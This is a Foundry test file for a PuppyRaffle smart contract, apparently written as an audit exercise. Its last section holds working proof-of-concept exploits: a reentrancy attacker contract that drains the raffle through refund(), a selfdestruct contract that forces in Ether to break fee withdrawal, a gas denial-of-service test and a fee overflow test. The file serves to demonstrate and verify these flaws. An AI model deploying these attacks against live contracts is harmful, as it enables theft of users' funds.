// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }

    //////////////////////
    /// EnterRaffle    ///
    /////////////////////

    function testCanEnterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.players(0), playerOne);
    }

    function testCantEnterWithoutPaying() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle(players);
    }

    function testCanEnterRaffleMany() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        assertEq(puppyRaffle.players(0), playerOne);
        assertEq(puppyRaffle.players(1), playerTwo);
    }

    function testCantEnterWithoutPayingMultiple() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testCantEnterWithDuplicatePlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    }

    function testCantEnterWithDuplicatePlayersMany() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }

    //////////////////////
    /// Refund         ///
    /////////////////////
    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    function testCanGetRefund() public playerEntered {
        uint256 balanceBefore = address(playerOne).balance;
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
    }

    function testGettingRefundRemovesThemFromArray() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(puppyRaffle.players(0), address(0));
    }

    function testOnlyPlayerCanRefundThemself() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        vm.prank(playerTwo);
        puppyRaffle.refund(indexOfPlayer);
    }

    //////////////////////
    /// getActivePlayerIndex         ///
    /////////////////////
    function testGetActivePlayerIndexManyPlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
    }

    //////////////////////
    /// selectWinner         ///
    /////////////////////
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
    }

    function testCantSelectWinnerWithFewerThanFourPlayers() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = address(3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
    }

    function testSelectWinner() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    function testSelectWinnerGetsPaid() public playersEntered {
        uint256 balanceBefore = address(playerFour).balance;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPayout = ((entranceFee * 4) * 80 / 100);

        puppyRaffle.selectWinner();
        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
    }

    function testSelectWinnerGetsAPuppy() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.balanceOf(playerFour), 1);
    }

    function testPuppyUriIsRight() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        string memory expectedTokenUri =
            "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
    }

    //////////////////////
    /// withdrawFees         ///
    /////////////////////
    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function testWithdrawFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
        assertEq(address(feeAddress).balance, expectedPrizeAmount);
    }

    //////////////////////
    /// exploits         ///
    /////////////////////

    function test_DoS_attack() public {
        vm.txGasPrice(1);

        // Let's enter 100 players
        uint256 numPlayer = 100;
        address[] memory players = new address[](numPlayer);
        for (uint256 i = 0; i < numPlayer; i++) {
            players[i] = address(i);
        }

        // Let's calculate the gas cost
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst100 = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas used for the first 100 players: ", gasUsedFirst100);

        // Now for the second 100 players
        address[] memory players2 = new address[](numPlayer);
        for (uint256 i = 0; i < numPlayer; i++) {
            players2[i] = address(numPlayer + i);
        }

        // Let's calculate the gas cost
        uint256 gasStart2 = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players2.length}(players2);
        uint256 gasEnd2 = gasleft();
        uint256 gasUsedSecond100 = (gasStart2 - gasEnd2) * tx.gasprice;
        console.log("Gas used for the second 100 players: ", gasUsedSecond100);

        assert(gasUsedSecond100 > gasUsedFirst100);
    }

    function test_refund_reentrancy_attack() public {
        // Let's enter 10 players
        uint256 numPlayer = 10;
        address[] memory players = new address[](numPlayer);
        for (uint256 i = 0; i < numPlayer; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);

        // now the contract holds entranceFee * 10 = 10 eth
        assertEq(address(puppyRaffle).balance, entranceFee * players.length);

        // Let's deploy our ReentrancyAttacker and check it has balance = 0
        ReentrancyAttacker reentrancyAttacker = new ReentrancyAttacker(
            address(puppyRaffle)
        );
        assertEq(address(reentrancyAttacker).balance, 0);

        console.log("PuppyRaffle balance before: ", address(puppyRaffle).balance);
        console.log("Attacker balance before: ", address(reentrancyAttacker).balance);

        // now let's call the attack function that will enter the Raffle and drain all the funds from the PuppyRuffle contract.
        reentrancyAttacker.attack{value: entranceFee}();

        console.log("PuppyRaffle balance after: ", address(puppyRaffle).balance);
        console.log("Attacker balance after: ", address(reentrancyAttacker).balance);
        assertEq(address(puppyRaffle).balance, 0);
        // +1 cause of the attacker entranceFee
        assertEq(address(reentrancyAttacker).balance, entranceFee * (players.length + 1));
    }

    function test_overflowFee() public {
        // the max uint64 value = 18,446,744,073,709,551,615
        // which divided by 1 eth = 18,446744074

        // so fee = (totalAmountCollected * 20) / 100 has to be <= than that max value

        // Let's say we have 90 players => totalAmountCollected = 90 ether. The 20% of that = 18 ether.
        // Let's see if this overflows

        // Let's enter 90 players
        uint256 numPlayer = 90;
        address[] memory players = new address[](numPlayer);
        for (uint256 i = 0; i < numPlayer; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);

        // move up 1 day to be able to call selectWinner
        vm.warp(block.timestamp + 1 days);
        // Let's call the selectWinner() function
        puppyRaffle.selectWinner();

        uint256 total_fees = puppyRaffle.totalFees();
        console.log("Last winner: ", puppyRaffle.previousWinner());
        console.log("Total collected fees: ", total_fees);
        assertEq(total_fees, numPlayer * entranceFee * 20 / 100); // 18 ether for 90 players

        // Let's say now we have 100 players => totalAmountCollected = 100 ether. The 20% of that = 20 ether.
        // Let's see if this overflows
        // Let's enter 100 players
        numPlayer = 100;
        address[] memory players100 = new address[](numPlayer);
        for (uint256 i = 0; i < numPlayer; i++) {
            players100[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * players100.length}(players100);

        // move up 1 day to be able to call selectWinner
        vm.warp(block.timestamp + 1 days);
        // Let's call the selectWinner() function
        puppyRaffle.selectWinner();

        uint256 last_total_fees = puppyRaffle.totalFees();
        console.log("Last winner: ", puppyRaffle.previousWinner());
        console.log("Total collected fees: ", last_total_fees);
        assertNotEq(last_total_fees, numPlayer * entranceFee * 20 / 100); // should be 20 ether for 100 players, but it is not

        assertLt(last_total_fees, total_fees);

        // Also, the feeAddress will never be able to receive the fee collected from the players.
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function test_mishandlingEthWithdrawFee() public {
        // force Eth into PuppyRuffle to break the withdrawFees function:
        // require(address(this).balance == uint256(totalFees)) this will always fail because it relies on this.balance.

        SelfDestrcutAndForceEthIntoPuppy selfDestruct = new SelfDestrcutAndForceEthIntoPuppy(puppyRaffle);
        vm.deal(address(selfDestruct), 1 ether);
        assertEq(address(selfDestruct).balance, 1 ether);

        // call attack and force 1 eth into the Ruffle (with no players entered)
        selfDestruct.attack();
        assertEq(address(puppyRaffle).balance, 1 ether);

        // now the withdrawFees is broken
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}

contract SelfDestrcutAndForceEthIntoPuppy {

    PuppyRaffle puppyRaffle;
    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle; 
    }

    function attack() external {
        // force eth into puppyRuffle
        selfdestruct(payable(address(puppyRaffle)));
    }

    receive() payable external {}
}

contract ReentrancyAttacker {

    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 _attackerIndex;

    constructor(address _puppyRuffle) {
        puppyRaffle = PuppyRaffle(_puppyRuffle);
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory attackers = new address[](1);
        attackers[0] = address(this);
        puppyRaffle.enterRaffle{value: msg.value}(attackers);

        _attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(_attackerIndex);
    }

    receive() payable external {
        if(address(puppyRaffle).balance >= entranceFee){
            puppyRaffle.refund(_attackerIndex);
        }
    }
}

